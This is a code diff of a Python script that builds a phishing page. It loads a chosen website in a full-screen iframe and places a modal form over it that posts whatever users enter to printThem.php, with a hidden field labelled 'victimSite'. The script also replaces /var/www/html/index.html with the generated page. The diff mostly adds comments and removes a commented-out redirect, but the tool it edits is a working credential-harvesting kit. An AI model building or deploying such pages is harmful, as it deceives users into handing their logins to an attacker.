@@ -5,7 +5,6 @@ site = str(sys.argv[1]) #bring in website to emulate as a parameter
 
 targetFile= open('index.html','w')
 
-
 print ("\nEmulating website: " + site + " at http://localhost" + "\n")
 
 #Generates an iframe of target website 
@@ -22,6 +21,7 @@ targetFile.write("\n")
 targetFile.write("\n<body onLoad=\"$('#my-modal').modal('show');\">")
 targetFile.write("\n")   
 targetFile.write("\n<form action=\"printThem.php\" method=\"post\">")
+# create hidden variable in HTML to send to the printThem.php file
 targetFile.write("<input type=\"hidden\" name=\"victimSite\" value=\"" + site + "\">")
 targetFile.write("\n")
 targetFile.write("       <div id=\"my-modal\" class=\"modal fade\">")
@@ -54,17 +54,14 @@ targetFile.write("")
 targetFile.write(" </form>")
 targetFile.write("<!-- int file_put_contents ( string text.txt , mixed name [, int $flags = 0 [, resource $context ]] ) -->")
 targetFile.write("")
+#  This is where the iframe is generated 
 targetFile.write("<iframe src=\"" + site + "\" style=\"border: 0; width: 100%; height: 100%\">Your browser doesn't support iFrames.</iframe>")
 targetFile.write("")
-#targetFile.write("<meta http-equiv=\"refresh\" content=\"0; url=" + site + "\" />")
 targetFile.write("")
 targetFile.write("</body>")
 targetFile.write("</html>")
 
-
 targetFile.close()
-
-
 
 os.remove("/var/www/html/index.html")
 
